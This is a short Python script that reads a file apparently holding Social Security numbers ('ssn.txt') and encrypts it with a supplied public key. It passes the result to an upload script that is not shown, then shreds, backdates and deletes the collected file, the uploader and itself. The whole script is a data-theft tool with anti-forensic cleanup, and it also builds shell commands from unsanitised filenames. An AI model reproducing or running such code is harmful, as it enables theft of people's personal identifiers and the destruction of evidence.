#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP as ciphersuite
from os import system

def securedelete(filename):
	newfilename = '0' * 255
	command = 'shred -z ' +  filename + ' && touch --date="1 Jan 1970 00:00:00 UTC" ' + filename + ' && mv ' + filename + ' ' + newfilename + ' && rm ' + newfilename
	system(command)

key_ascii = '''''' # enter ascii encoded public key

key = RSA.import_key(key_ascii)

cipher_rsa = ciphersuite.new(key)
data = open("ssn.txt", "rb").read()
ciphertext = cipher_rsa.encrypt(data)

file = open("collection.bin", "wb")
file.write(ciphertext)
file.close()

system('./upload.sh collection.bin')

securedelete('collection.bin')
securedelete('upload.sh')
securedelete(__file__) # make script delete itself

